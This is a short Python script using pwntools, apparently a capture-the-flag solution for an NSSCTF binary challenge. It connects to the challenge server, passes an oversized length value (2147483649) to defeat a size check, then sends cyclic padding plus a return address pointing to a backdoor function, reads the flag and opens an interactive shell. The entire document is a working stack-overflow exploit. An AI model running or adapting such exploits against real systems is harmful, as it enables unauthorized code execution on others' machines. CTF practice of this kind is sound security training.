from pwn import *

context(os = "linux", arch = "amd64", log_level= "debug")

ip = "node4.anna.nssctf.cn"
port = 28775

p = remote(ip, port)

backdoor = 0x400726
payload = cyclic(0x18) + p64(backdoor)

p.sendlineafter("length of your name:", "2147483649")
p.sendlineafter("name?", payload)
p.sendline("cat flag")
p.interactive()
